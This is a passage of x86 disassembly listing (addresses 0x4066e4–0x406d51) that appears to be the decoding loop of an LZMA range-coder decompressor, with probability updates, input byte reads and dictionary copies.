  4066e4:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  4066e7:	75 6f                	jne    0x406758
  4066e9:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  4066ed:	8b 75 a0             	mov    -0x60(%ebp),%esi
  4066f0:	b1 08                	mov    $0x8,%cl
  4066f2:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  4066f5:	23 75 e8             	and    -0x18(%ebp),%esi
  4066f8:	d3 e8                	shr    %cl,%eax
  4066fa:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4066fd:	d3 e6                	shl    %cl,%esi
  4066ff:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406702:	03 c6                	add    %esi,%eax
  406704:	8d 04 40             	lea    (%eax,%eax,2),%eax
  406707:	c1 e0 09             	shl    $0x9,%eax
  40670a:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  40670e:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  406715:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406718:	7d 05                	jge    0x40671f
  40671a:	89 55 c8             	mov    %edx,-0x38(%ebp)
  40671d:	eb 10                	jmp    0x40672f
  40671f:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  406723:	7d 06                	jge    0x40672b
  406725:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  406729:	eb 04                	jmp    0x40672f
  40672b:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  40672f:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  406732:	74 1c                	je     0x406750
  406734:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406737:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  40673a:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  40673d:	72 03                	jb     0x406742
  40673f:	03 45 8c             	add    -0x74(%ebp),%eax
  406742:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406745:	33 db                	xor    %ebx,%ebx
  406747:	43                   	inc    %ebx
  406748:	8a 04 08             	mov    (%eax,%ecx,1),%al
  40674b:	88 45 a5             	mov    %al,-0x5b(%ebp)
  40674e:	eb 68                	jmp    0x4067b8
  406750:	33 db                	xor    %ebx,%ebx
  406752:	43                   	inc    %ebx
  406753:	e9 cd 01 00 00       	jmp    0x406925
  406758:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40675b:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40675e:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  406765:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  40676c:	00 00 00 
  40676f:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  406776:	e9 d3 05 00 00       	jmp    0x406d4e
  40677b:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40677f:	0f 84 67 07 00 00    	je     0x406eec
  406785:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406788:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40678b:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  40678f:	0f b6 09             	movzbl (%ecx),%ecx
  406792:	ff 4d 94             	decl   -0x6c(%ebp)
  406795:	c1 e0 08             	shl    $0x8,%eax
  406798:	0b c1                	or     %ecx,%eax
  40679a:	ff 45 90             	incl   -0x70(%ebp)
  40679d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4067a0:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4067a3:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  4067a6:	0f 85 ad 00 00 00    	jne    0x406859
  4067ac:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  4067b2:	0f 8d 05 01 00 00    	jge    0x4068bd
  4067b8:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
  4067bc:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  4067bf:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4067c2:	c1 e8 07             	shr    $0x7,%eax
  4067c5:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4067c8:	40                   	inc    %eax
  4067c9:	c1 e0 08             	shl    $0x8,%eax
  4067cc:	03 c3                	add    %ebx,%eax
  4067ce:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  4067d1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4067d4:	c1 e9 0b             	shr    $0xb,%ecx
  4067d7:	66 8b 06             	mov    (%esi),%ax
  4067da:	89 75 ac             	mov    %esi,-0x54(%ebp)
  4067dd:	0f b7 d0             	movzwl %ax,%edx
  4067e0:	0f af ca             	imul   %edx,%ecx
  4067e3:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  4067e6:	73 1a                	jae    0x406802
  4067e8:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  4067ec:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4067ef:	b9 00 08 00 00       	mov    $0x800,%ecx
  4067f4:	2b ca                	sub    %edx,%ecx
  4067f6:	c1 f9 05             	sar    $0x5,%ecx
  4067f9:	03 c8                	add    %eax,%ecx
  4067fb:	03 db                	add    %ebx,%ebx
  4067fd:	66 89 0e             	mov    %cx,(%esi)
  406800:	eb 1d                	jmp    0x40681f
  406802:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406805:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406808:	66 8b c8             	mov    %ax,%cx
  40680b:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406812:	66 c1 e9 05          	shr    $0x5,%cx
  406816:	2b c1                	sub    %ecx,%eax
  406818:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  40681c:	66 89 06             	mov    %ax,(%esi)
  40681f:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406826:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406829:	0f 83 71 ff ff ff    	jae    0x4067a0
  40682f:	e9 47 ff ff ff       	jmp    0x40677b
  406834:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406838:	0f 84 ba 06 00 00    	je     0x406ef8
  40683e:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406841:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406844:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406848:	0f b6 09             	movzbl (%ecx),%ecx
  40684b:	ff 4d 94             	decl   -0x6c(%ebp)
  40684e:	c1 e0 08             	shl    $0x8,%eax
  406851:	0b c1                	or     %ecx,%eax
  406853:	ff 45 90             	incl   -0x70(%ebp)
  406856:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406859:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  40685f:	7d 5c                	jge    0x4068bd
  406861:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406864:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406867:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40686a:	8d 34 02             	lea    (%edx,%eax,1),%esi
  40686d:	c1 e9 0b             	shr    $0xb,%ecx
  406870:	66 8b 06             	mov    (%esi),%ax
  406873:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406876:	0f b7 f8             	movzwl %ax,%edi
  406879:	0f af cf             	imul   %edi,%ecx
  40687c:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  40687f:	73 16                	jae    0x406897
  406881:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406884:	b9 00 08 00 00       	mov    $0x800,%ecx
  406889:	2b cf                	sub    %edi,%ecx
  40688b:	c1 f9 05             	sar    $0x5,%ecx
  40688e:	03 c8                	add    %eax,%ecx
  406890:	03 db                	add    %ebx,%ebx
  406892:	66 89 0e             	mov    %cx,(%esi)
  406895:	eb 15                	jmp    0x4068ac
  406897:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  40689a:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  40689d:	66 8b c8             	mov    %ax,%cx
  4068a0:	8d 5a 01             	lea    0x1(%edx),%ebx
  4068a3:	66 c1 e9 05          	shr    $0x5,%cx
  4068a7:	2b c1                	sub    %ecx,%eax
  4068a9:	66 89 06             	mov    %ax,(%esi)
  4068ac:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4068b3:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4068b6:	73 a1                	jae    0x406859
  4068b8:	e9 77 ff ff ff       	jmp    0x406834
  4068bd:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  4068c1:	8a 45 bc             	mov    -0x44(%ebp),%al
  4068c4:	88 45 a4             	mov    %al,-0x5c(%ebp)
  4068c7:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  4068cb:	0f 84 3f 06 00 00    	je     0x406f10
  4068d1:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  4068d4:	8a 45 a4             	mov    -0x5c(%ebp),%al
  4068d7:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4068da:	ff 45 a0             	incl   -0x60(%ebp)
  4068dd:	ff 45 98             	incl   -0x68(%ebp)
  4068e0:	ff 4d 9c             	decl   -0x64(%ebp)
  4068e3:	88 01                	mov    %al,(%ecx)
  4068e5:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4068e8:	88 04 11             	mov    %al,(%ecx,%edx,1)
  4068eb:	8d 41 01             	lea    0x1(%ecx),%eax
  4068ee:	33 d2                	xor    %edx,%edx
  4068f0:	f7 75 8c             	divl   -0x74(%ebp)
  4068f3:	e9 95 01 00 00       	jmp    0x406a8d
  4068f8:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4068fc:	0f 84 02 06 00 00    	je     0x406f04
  406902:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406905:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406908:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  40690c:	0f b6 09             	movzbl (%ecx),%ecx
  40690f:	ff 4d 94             	decl   -0x6c(%ebp)
  406912:	c1 e0 08             	shl    $0x8,%eax
  406915:	0b c1                	or     %ecx,%eax
  406917:	ff 45 90             	incl   -0x70(%ebp)
  40691a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40691d:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406923:	7d 9c                	jge    0x4068c1
  406925:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406928:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  40692b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40692e:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406931:	c1 e9 0b             	shr    $0xb,%ecx
  406934:	66 8b 06             	mov    (%esi),%ax
  406937:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40693a:	0f b7 f8             	movzwl %ax,%edi
  40693d:	0f af cf             	imul   %edi,%ecx
  406940:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406943:	73 16                	jae    0x40695b
  406945:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406948:	b9 00 08 00 00       	mov    $0x800,%ecx
  40694d:	2b cf                	sub    %edi,%ecx
  40694f:	c1 f9 05             	sar    $0x5,%ecx
  406952:	03 c8                	add    %eax,%ecx
  406954:	03 db                	add    %ebx,%ebx
  406956:	66 89 0e             	mov    %cx,(%esi)
  406959:	eb 15                	jmp    0x406970
  40695b:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  40695e:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406961:	66 8b c8             	mov    %ax,%cx
  406964:	8d 5a 01             	lea    0x1(%edx),%ebx
  406967:	66 c1 e9 05          	shr    $0x5,%cx
  40696b:	2b c1                	sub    %ecx,%eax
  40696d:	66 89 06             	mov    %ax,(%esi)
  406970:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406977:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40697a:	73 a1                	jae    0x40691d
  40697c:	e9 77 ff ff ff       	jmp    0x4068f8
  406981:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  406985:	75 1c                	jne    0x4069a3
  406987:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40698a:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40698d:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  406994:	00 00 00 
  406997:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  40699e:	e9 ab 03 00 00       	jmp    0x406d4e
  4069a3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4069a6:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  4069ad:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4069b0:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4069b3:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4069b6:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4069b9:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4069bc:	33 c0                	xor    %eax,%eax
  4069be:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  4069c2:	0f 9d c0             	setge  %al
  4069c5:	48                   	dec    %eax
  4069c6:	24 fd                	and    $0xfd,%al
  4069c8:	83 c0 0a             	add    $0xa,%eax
  4069cb:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4069ce:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4069d1:	05 64 06 00 00       	add    $0x664,%eax
  4069d6:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4069d9:	8b 75 a8             	mov    -0x58(%ebp),%esi
  4069dc:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  4069e3:	00 00 00 
  4069e6:	e9 63 03 00 00       	jmp    0x406d4e
  4069eb:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4069ef:	75 21                	jne    0x406a12
  4069f1:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4069f4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4069f7:	83 c0 0f             	add    $0xf,%eax
  4069fa:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  406a01:	00 00 00 
  406a04:	c1 e0 04             	shl    $0x4,%eax
  406a07:	03 45 b4             	add    -0x4c(%ebp),%eax
  406a0a:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406a0d:	e9 3c 03 00 00       	jmp    0x406d4e
  406a12:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a15:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406a18:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  406a1f:	00 00 00 
  406a22:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  406a29:	e9 20 03 00 00       	jmp    0x406d4e
  406a2e:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406a32:	0f 85 b1 00 00 00    	jne    0x406ae9
  406a38:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  406a3c:	0f 84 3b 05 00 00    	je     0x406f7d
  406a42:	33 c0                	xor    %eax,%eax
  406a44:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406a48:	0f 9d c0             	setge  %al
  406a4b:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  406a4f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406a52:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406a56:	0f 84 c0 04 00 00    	je     0x406f1c
  406a5c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406a5f:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406a62:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406a65:	72 03                	jb     0x406a6a
  406a67:	03 45 8c             	add    -0x74(%ebp),%eax
  406a6a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406a6d:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406a70:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406a73:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  406a76:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406a79:	40                   	inc    %eax
  406a7a:	33 d2                	xor    %edx,%edx
  406a7c:	f7 75 8c             	divl   -0x74(%ebp)
  406a7f:	8b 45 98             	mov    -0x68(%ebp),%eax
  406a82:	ff 45 a0             	incl   -0x60(%ebp)
  406a85:	ff 45 98             	incl   -0x68(%ebp)
  406a88:	ff 4d 9c             	decl   -0x64(%ebp)
  406a8b:	88 08                	mov    %cl,(%eax)
  406a8d:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406a90:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  406a97:	00 00 00 
  406a9a:	e9 c7 fa ff ff       	jmp    0x406566
  406a9f:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406aa3:	75 05                	jne    0x406aaa
  406aa5:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406aa8:	eb 36                	jmp    0x406ae0
  406aaa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406aad:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406ab0:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  406ab7:	00 00 00 
  406aba:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  406ac1:	e9 88 02 00 00       	jmp    0x406d4e
  406ac6:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406aca:	75 05                	jne    0x406ad1
  406acc:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406acf:	eb 09                	jmp    0x406ada
  406ad1:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406ad4:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406ad7:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  406ada:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  406add:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  406ae0:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  406ae3:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406ae6:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  406ae9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406aec:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  406af3:	05 68 0a 00 00       	add    $0xa68,%eax
  406af8:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406afb:	e9 d9 fe ff ff       	jmp    0x4069d9
  406b00:	33 c0                	xor    %eax,%eax
  406b02:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406b06:	0f 9d c0             	setge  %al
  406b09:	48                   	dec    %eax
  406b0a:	24 fd                	and    $0xfd,%al
  406b0c:	83 c0 0b             	add    $0xb,%eax
  406b0f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406b12:	e9 9a 01 00 00       	jmp    0x406cb1
  406b17:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406b1a:	83 f8 04             	cmp    $0x4,%eax
  406b1d:	7c 03                	jl     0x406b22
  406b1f:	6a 03                	push   $0x3
  406b21:	58                   	pop    %eax
  406b22:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406b25:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  406b2c:	c1 e0 07             	shl    $0x7,%eax
  406b2f:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  406b36:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  406b3d:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406b40:	e9 ce 02 00 00       	jmp    0x406e13
  406b45:	83 fb 04             	cmp    $0x4,%ebx
  406b48:	7c 34                	jl     0x406b7e
  406b4a:	8b cb                	mov    %ebx,%ecx
  406b4c:	8b c3                	mov    %ebx,%eax
  406b4e:	d1 f9                	sar    $1,%ecx
  406b50:	83 e0 01             	and    $0x1,%eax
  406b53:	49                   	dec    %ecx
  406b54:	0c 02                	or     $0x2,%al
  406b56:	d3 e0                	shl    %cl,%eax
  406b58:	83 fb 0e             	cmp    $0xe,%ebx
  406b5b:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406b5e:	7d 14                	jge    0x406b74
  406b60:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406b63:	2b c3                	sub    %ebx,%eax
  406b65:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  406b68:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  406b6f:	e9 81 00 00 00       	jmp    0x406bf5
  406b74:	33 db                	xor    %ebx,%ebx
  406b76:	83 c1 fc             	add    $0xfffffffc,%ecx
  406b79:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  406b7c:	eb 33                	jmp    0x406bb1
  406b7e:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  406b81:	e9 28 01 00 00       	jmp    0x406cae
  406b86:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406b8a:	0f 84 98 03 00 00    	je     0x406f28
  406b90:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406b93:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406b96:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406b9a:	0f b6 09             	movzbl (%ecx),%ecx
  406b9d:	ff 4d 94             	decl   -0x6c(%ebp)
  406ba0:	c1 e0 08             	shl    $0x8,%eax
  406ba3:	0b c1                	or     %ecx,%eax
  406ba5:	ff 45 90             	incl   -0x70(%ebp)
  406ba8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406bab:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406bae:	ff 4d b8             	decl   -0x48(%ebp)
  406bb1:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  406bb5:	7e 27                	jle    0x406bde
  406bb7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406bba:	03 db                	add    %ebx,%ebx
  406bbc:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  406bbf:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  406bc2:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406bc5:	72 0c                	jb     0x406bd3
  406bc7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406bca:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406bcd:	83 cb 01             	or     $0x1,%ebx
  406bd0:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406bd3:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406bda:	73 d2                	jae    0x406bae
  406bdc:	eb a8                	jmp    0x406b86
  406bde:	c1 e3 04             	shl    $0x4,%ebx
  406be1:	03 c3                	add    %ebx,%eax
  406be3:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  406bea:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406bed:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406bf0:	05 44 06 00 00       	add    $0x644,%eax
  406bf5:	33 db                	xor    %ebx,%ebx
  406bf7:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406bfa:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  406c01:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406c04:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  406c07:	eb 28                	jmp    0x406c31
  406c09:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406c0d:	0f 84 21 03 00 00    	je     0x406f34
  406c13:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406c16:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406c19:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406c1d:	0f b6 09             	movzbl (%ecx),%ecx
  406c20:	ff 4d 94             	decl   -0x6c(%ebp)
  406c23:	c1 e0 08             	shl    $0x8,%eax
  406c26:	0b c1                	or     %ecx,%eax
  406c28:	ff 45 90             	incl   -0x70(%ebp)
  406c2b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406c2e:	ff 45 b8             	incl   -0x48(%ebp)
  406c31:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406c34:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406c37:	7d 72                	jge    0x406cab
  406c39:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406c3c:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406c3f:	c1 ea 0b             	shr    $0xb,%edx
  406c42:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  406c45:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406c48:	8d 34 07             	lea    (%edi,%eax,1),%esi
  406c4b:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406c4e:	66 8b 06             	mov    (%esi),%ax
  406c51:	0f b7 c8             	movzwl %ax,%ecx
  406c54:	0f af d1             	imul   %ecx,%edx
  406c57:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  406c5a:	73 17                	jae    0x406c73
  406c5c:	89 55 f0             	mov    %edx,-0x10(%ebp)
  406c5f:	ba 00 08 00 00       	mov    $0x800,%edx
  406c64:	2b d1                	sub    %ecx,%edx
  406c66:	c1 fa 05             	sar    $0x5,%edx
  406c69:	03 d0                	add    %eax,%edx
  406c6b:	d1 65 b0             	shll   $1,-0x50(%ebp)
  406c6e:	66 89 16             	mov    %dx,(%esi)
  406c71:	eb 2a                	jmp    0x406c9d
  406c73:	33 c9                	xor    %ecx,%ecx
  406c75:	29 55 f0             	sub    %edx,-0x10(%ebp)
  406c78:	41                   	inc    %ecx
  406c79:	29 55 f4             	sub    %edx,-0xc(%ebp)
  406c7c:	8b d9                	mov    %ecx,%ebx
  406c7e:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  406c81:	d3 e3                	shl    %cl,%ebx
  406c83:	8b cb                	mov    %ebx,%ecx
  406c85:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406c88:	0b d9                	or     %ecx,%ebx
  406c8a:	66 8b c8             	mov    %ax,%cx
  406c8d:	66 c1 e9 05          	shr    $0x5,%cx
  406c91:	2b c1                	sub    %ecx,%eax
  406c93:	47                   	inc    %edi
  406c94:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406c97:	66 89 06             	mov    %ax,(%esi)
  406c9a:	89 7d b0             	mov    %edi,-0x50(%ebp)
  406c9d:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406ca4:	73 88                	jae    0x406c2e
  406ca6:	e9 5e ff ff ff       	jmp    0x406c09
  406cab:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  406cae:	ff 45 d4             	incl   -0x2c(%ebp)
  406cb1:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406cb4:	85 c0                	test   %eax,%eax
  406cb6:	0f 84 84 02 00 00    	je     0x406f40
  406cbc:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  406cbf:	0f 87 b8 02 00 00    	ja     0x406f7d
  406cc5:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  406cc9:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406ccc:	01 45 a0             	add    %eax,-0x60(%ebp)
  406ccf:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406cd3:	0f 84 6d 02 00 00    	je     0x406f46
  406cd9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406cdc:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406cdf:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406ce2:	72 03                	jb     0x406ce7
  406ce4:	03 45 8c             	add    -0x74(%ebp),%eax
  406ce7:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406cea:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406ced:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406cf0:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  406cf3:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406cf6:	40                   	inc    %eax
  406cf7:	33 d2                	xor    %edx,%edx
  406cf9:	f7 75 8c             	divl   -0x74(%ebp)
  406cfc:	8b 45 98             	mov    -0x68(%ebp),%eax
  406cff:	ff 45 98             	incl   -0x68(%ebp)
  406d02:	ff 4d 9c             	decl   -0x64(%ebp)
  406d05:	ff 4d d0             	decl   -0x30(%ebp)
  406d08:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  406d0c:	88 08                	mov    %cl,(%eax)
  406d0e:	89 55 ec             	mov    %edx,-0x14(%ebp)
  406d11:	7f bc                	jg     0x406ccf
  406d13:	e9 78 fd ff ff       	jmp    0x406a90
  406d18:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406d1c:	75 20                	jne    0x406d3e
  406d1e:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  406d21:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  406d25:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406d28:	c1 e0 04             	shl    $0x4,%eax
  406d2b:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  406d2f:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406d32:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  406d39:	e9 ce 00 00 00       	jmp    0x406e0c
  406d3e:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406d41:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  406d48:	00 00 00 
  406d4b:	8d 70 02             	lea    0x2(%eax),%esi
  406d4e:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406d51:	66 8b 06             	mov    (%esi),%ax
